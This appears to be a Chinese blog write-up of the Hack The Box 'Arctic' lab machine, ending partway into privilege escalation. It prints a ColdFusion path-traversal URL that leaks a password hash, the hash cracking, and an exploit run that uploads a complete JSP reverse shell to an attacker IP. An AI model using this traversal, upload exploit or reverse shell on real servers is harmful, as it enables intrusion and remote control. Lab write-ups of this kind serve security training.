@@ -1,0 +1,783 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：ColdFusion任意文件读取漏洞、john哈希破解、ColdFusion 8 RCE漏洞、文件传输技能、Chimichurri.exe漏洞利用工具使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Arctic-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/03/08/Arctic-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：ColdFusion任意文件读取漏洞、john哈希破解、ColdFusion 8 RCE漏洞、文件传输技能、Chimichurri.exe漏洞利用工具使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Arctic-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Arctic-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Arctic-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Arctic-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Arctic-htb-writeup/6.png">
+<meta property="article:published_time" content="2024-03-08T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-03-26T14:37:39.048Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Arctic-htb-writeup/1.png">
+  
+  
+  
+  <title>Arctic-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Arctic-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-08 23:50" pubdate>
+          2024年3月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          93 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Arctic-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：ColdFusion任意文件读取漏洞、john哈希破解、ColdFusion 8 RCE漏洞、文件传输技能、Chimichurri.exe漏洞利用工具使用</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://www.jgeek.cn/article/66</code></p>
+<p>参考链接：<code>https://0xdf.gitlab.io/2020/05/19/htb-arctic.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.11</p>
+<p>2、扫描下开放端口情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">PORT      STATE SERVICE VERSION<br><span class="hljs-number">135</span>/tcp   open  msrpc   Microsoft Windows RPC<br><span class="hljs-number">8500</span>/tcp  open  fmtp?<br><span class="hljs-number">49154</span>/tcp open  msrpc   Microsoft Windows RPC<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br></code></pre></td></tr></table></figure>
+
+<p>3、访问下8500端口的服务情况</p>
+<p><code>http://10.10.10.11:8500/</code></p>
+<p><img src="http://sh1yan.top/photo/Arctic-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、访问CFIDE目录下的文件</p>
+<p><img src="http://sh1yan.top/photo/Arctic-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、发现该服务疑似是 ColdFusion 的服务，结合综合信息，进行关键词搜索</p>
+<p><code>coldfusion directory traversal</code></p>
+<p><img src="http://sh1yan.top/photo/Arctic-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、位于首页的就是一个漏洞链接，进行查看</p>
+<p><code>https://www.exploit-db.com/exploits/14641</code></p>
+<p>7、结合里面的说明，进行漏洞利用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</span><br><br>http:<span class="hljs-comment">//10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Arctic-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">#Wed Mar <span class="hljs-number">22</span> <span class="hljs-number">20</span>:<span class="hljs-number">53</span>:<span class="hljs-number">51</span> EET <span class="hljs-number">2017</span> rdspassword=<span class="hljs-number">0</span>IA/F[[E&gt;[$_6&amp; \\Q&gt;[K\=XP \n password=<span class="hljs-number">2F</span>635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=<span class="hljs-literal">true</span><br><br>#Wed Mar <span class="hljs-number">22</span> <span class="hljs-number">20</span>:<span class="hljs-number">53</span>:<span class="hljs-number">51</span> EET <span class="hljs-number">2017</span> rdspassword=<span class="hljs-number">0</span>IA/F[[E&gt;[$_6&amp; \\Q&gt;[K\=XP \n password=<span class="hljs-number">2F</span>635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=<span class="hljs-literal">true</span> <br></code></pre></td></tr></table></figure>
+
+<p>8、接下来使用john进行哈希破解</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo john hash  -w /usr/share/wordlists/rockyou.txt <br><br><span class="hljs-title function_">happyday</span>         <span class="hljs-params">(?)</span> <br><br>https:<span class="hljs-comment">//sha1.gromweb.com/?hash=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03</span><br></code></pre></td></tr></table></figure>
+
+<p>9、这里应该是使用密码成功登录后台</p>
+<p><img src="http://sh1yan.top/photo/Arctic-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、根据首页的信息 ColdFusion 8 ，搜索相关漏洞信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ searchsploit ColdFusion <span class="hljs-number">8</span><br>----------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                               |  Path<br>----------------------------------------------------------------------------- ---------------------------------<br>Adobe ColdFusion &lt; <span class="hljs-number">11</span> Update <span class="hljs-number">10</span> - XML External Entity Injection              | multiple/webapps/<span class="hljs-number">40346.</span>py<br>Adobe ColdFusion Server <span class="hljs-number">8.0</span><span class="hljs-number">.1</span> - <span class="hljs-string">&#x27;/administrator/enter.cfm&#x27;</span> Query String Cros | cfm/webapps/<span class="hljs-number">33170.</span>txt<br>Adobe ColdFusion Server <span class="hljs-number">8.0</span><span class="hljs-number">.1</span> - <span class="hljs-string">&#x27;/wizards/common/_authenticatewizarduser.cfm | cfm/webapps/33167.txt</span><br><span class="hljs-string">Adobe ColdFusion Server 8.0.1 - &#x27;</span>/wizards/common/_logintowizard.cfm<span class="hljs-number">&#x27;</span> Query S | cfm/webapps/<span class="hljs-number">33169.</span>txt<br>Adobe ColdFusion Server <span class="hljs-number">8.0</span><span class="hljs-number">.1</span> - <span class="hljs-string">&#x27;administrator/logviewer/searchlog.cfm?start | cfm/webapps/33168.txt</span><br><span class="hljs-string">ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)            | cfm/webapps/16788.rb</span><br><span class="hljs-string">ColdFusion MX - Missing Template Cross-Site Scripting                        | cfm/remote/21548.txt</span><br><span class="hljs-string">Adobe ColdFusion 8 - Remote Command Execution (RCE)                          | cfm/webapps/50057.py</span><br><span class="hljs-string">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="hljs-string">Shellcodes: No Results</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Adobe ColdFusion 8 - Remote Command Execution (RCE)                          | cfm/webapps/50057.py</span><br></code></pre></td></tr></table></figure>
+
+<p>11、这里让我关注到的是这个远程命令执行的漏洞</p>
+<p>12、通过查看漏洞源码里的信息，发现是可生成shell的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"># Generate a payload that connects back and spawns a command shell<br><span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-string">&quot;\nGenerating a payload...&quot;</span>)</span><br>os.<span class="hljs-title function_">system</span><span class="hljs-params">(f<span class="hljs-string">&#x27;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&#123;lhost&#125; LPORT=&#123;lport&#125; -o &#123;filename&#125;.jsp&#x27;</span>)</span><br><br># Create a request<br>request = urllib.request.Request(f<span class="hljs-number">&#x27;</span>http:<span class="hljs-comment">//&#123;rhost&#125;:&#123;rport&#125;/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=/&#123;filename&#125;.jsp%00&#x27;, data=data)</span><br></code></pre></td></tr></table></figure>
+
+<p>13、直接运行漏洞利用脚本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 <span class="hljs-number">50057.</span>py<br><br>Generating a payload...<br>Payload size: <span class="hljs-number">1496</span> bytes<br>Saved as: bedb3bfd29c546859f501ea88661e907.jsp<br><br>Priting request...<br>Content-type: multipart/form-data; boundary=f9b66a2735794d2a8a6427de08828976<br>Content-length: <span class="hljs-number">1697</span><br><br>--f9b66a2735794d2a8a6427de08828976<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;newfile&quot;</span>; filename=<span class="hljs-string">&quot;bedb3bfd29c546859f501ea88661e907.txt&quot;</span><br>Content-Type: text/plain<br><br>&lt;%@page import=<span class="hljs-string">&quot;java.lang.*&quot;</span>%&gt;<br>&lt;%@page import=<span class="hljs-string">&quot;java.util.*&quot;</span>%&gt;<br>&lt;%@page import=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%@page import=<span class="hljs-string">&quot;java.net.*&quot;</span>%&gt;<br><br>&lt;%<br>  class StreamConnector extends Thread<br>  &#123;<br>    InputStream bB;<br>    OutputStream sC;<br><br>    StreamConnector( InputStream bB, OutputStream sC )<br>    &#123;<br>      this.bB = bB;<br>      this.sC = sC;<br>    &#125;<br><br>    public <span class="hljs-type">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span><br>    &#123;<br>      BufferedReader eh  = null;<br>      BufferedWriter b5D = null;<br>      try<br>      &#123;<br>        eh  = new BufferedReader( new InputStreamReader( this.bB ) );<br>        b5D = new BufferedWriter( new OutputStreamWriter( this.sC ) );<br>        <span class="hljs-type">char</span> buffer[] = new <span class="hljs-type">char</span>[<span class="hljs-number">8192</span>];<br>        <span class="hljs-type">int</span> length;<br>        <span class="hljs-keyword">while</span>( ( length = eh.read( buffer, <span class="hljs-number">0</span>, buffer.length ) ) &gt; <span class="hljs-number">0</span> )<br>        &#123;<br>          b5D.write( buffer, <span class="hljs-number">0</span>, length );<br>          b5D.flush();<br>        &#125;<br>      &#125; catch( Exception e )&#123;&#125;<br>      try<br>      &#123;<br>        <span class="hljs-keyword">if</span>( eh != null )<br>          eh.close();<br>        <span class="hljs-keyword">if</span>( b5D != null )<br>          b5D.close();<br>      &#125; catch( Exception e )&#123;&#125;<br>    &#125;<br>  &#125;<br><br>  try<br>  &#123;<br>    String ShellPath;<br><span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="hljs-string">&quot;windows&quot;</span>) == <span class="hljs-number">-1</span>) &#123;<br>  ShellPath = new String(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  ShellPath = new String(<span class="hljs-string">&quot;cmd.exe&quot;</span>);<br>&#125;<br><br>    Socket socket = new Socket( <span class="hljs-string">&quot;10.10.14.2&quot;</span>, <span class="hljs-number">4444</span> );<br>    Process process = Runtime.getRuntime().exec( ShellPath );<br>    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();<br>    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();<br>  &#125; catch( Exception e ) &#123;&#125;<br>%&gt;<br><br>--f9b66a2735794d2a8a6427de08828976--<br><br><br>Sending request and printing response...<br><br><br>                &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>                        window.parent.OnUploadCompleted( <span class="hljs-number">0</span>, <span class="hljs-string">&quot;/userfiles/file/bedb3bfd29c546859f501ea88661e907.jsp/bedb3bfd29c546859f501ea88661e907.txt&quot;</span>, <span class="hljs-string">&quot;bedb3bfd29c546859f501ea88661e907.txt&quot;</span>, <span class="hljs-string">&quot;0&quot;</span> );<br>                &lt;/script&gt;<br><br><br>Printing some information <span class="hljs-keyword">for</span> debugging...<br>lhost: <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span><br>lport: <span class="hljs-number">4444</span><br>rhost: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span><br>rport: <span class="hljs-number">8500</span><br>payload: bedb3bfd29c546859f501ea88661e907.jsp<br><br>Deleting the payload...<br><br>Listening <span class="hljs-keyword">for</span> connection...<br><br>Executing the payload...<br>listening on [any] <span class="hljs-number">4444</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.2</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>] <span class="hljs-number">49256</span><br><br><br><br><br><br><br><br>Microsoft Windows [Version <span class="hljs-number">6.1</span><span class="hljs-number">.7600</span>]<br>Copyright (c) <span class="hljs-number">2009</span> Microsoft Corporation.  All rights reserved.<br><br>C:\ColdFusion8\runtime\bin&gt;whomai<br>whomai<br><br>C:\ColdFusion8\runtime\bin&gt;whoami<br>whoami<br>arctic\tolis<br><br>C:\ColdFusion8\runtime\bin&gt;<br></code></pre></td></tr></table></figure>
+
+<p>14、那就读取下初始的flag信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\ColdFusion8\runtime\bin&gt;type C:\Users\tolis\Desktop\user.txt<br>type C:\Users\tolis\Desktop\user.txt<br>a9021b88f3af397e2f746359b189f143<br><br>C:\ColdFusion8\runtime\bin&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>15、查看下系统信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\ColdFusion8\runtime\bin&gt;systeminfo<br>systeminfo<br><br>Host Name:                 ARCTIC<br>OS Name:                   Microsoft Windows Server <span class="hljs-number">2008</span> R2 Standard <br>OS Version:                <span class="hljs-number">6.1</span><span class="hljs-number">.7600</span> N/A Build <span class="hljs-number">7600</span><br>OS Manufacturer:           Microsoft Corporation<br>OS Configuration:          Standalone Server<br>OS Build Type:             Multiprocessor Free<br>Registered Owner:          Windows User<br>Registered Organization:   <br>Product ID:                <span class="hljs-number">55041</span><span class="hljs-number">-507</span><span class="hljs-number">-9857321</span><span class="hljs-number">-84451</span><br>Original Install Date:     <span class="hljs-number">22</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>, <span class="hljs-number">11</span>:<span class="hljs-number">09</span>:<span class="hljs-number">45</span> ��<br>System Boot Time:          <span class="hljs-number">9</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2024</span>, <span class="hljs-number">5</span>:<span class="hljs-number">52</span>:<span class="hljs-number">35</span> ��<br>System Manufacturer:       VMware, Inc.<br>System Model:              VMware Virtual Platform<br>System Type:               x64-based PC<br><span class="hljs-title function_">Processor</span><span class="hljs-params">(s)</span>:              1 <span class="hljs-title function_">Processor</span><span class="hljs-params">(s)</span> Installed.<br>                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz<br>BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018<br>Windows Directory:         C:\Windows<br>System Directory:          C:\Windows\system32<br>Boot Device:               \Device\HarddiskVolume1<br>System Locale:             el;Greek<br>Input Locale:              en-us;English (United States)<br>Time Zone:                 (UTC+<span class="hljs-number">02</span>:<span class="hljs-number">00</span>) Athens, Bucharest, Istanbul<br>Total Physical Memory:     <span class="hljs-number">6.143</span> MB<br>Available Physical Memory: <span class="hljs-number">5.042</span> MB<br>Virtual Memory: Max Size:  <span class="hljs-number">12.285</span> MB<br>Virtual Memory: Available: <span class="hljs-number">11.180</span> MB<br>Virtual Memory: In Use:    <span class="hljs-number">1.105</span> MB<br>Page File <span class="hljs-title function_">Location</span><span class="hljs-params">(s)</span>:     C:\pagefile.sys<br>Domain:                    HTB<br>Logon Server:              N/A<br><span class="hljs-title function_">Hotfix</span><span class="hljs-params">(s)</span>:                 N/A<br>Network <span class="hljs-title function_">Card</span><span class="hljs-params">(s)</span>:           1 <span class="hljs-title function_">NIC</span><span class="hljs-params">(s)</span> Installed.<br>                           [01]: <span class="hljs-title function_">Intel</span><span class="hljs-params">(R)</span> PRO/1000 MT Network Connection<br>                                 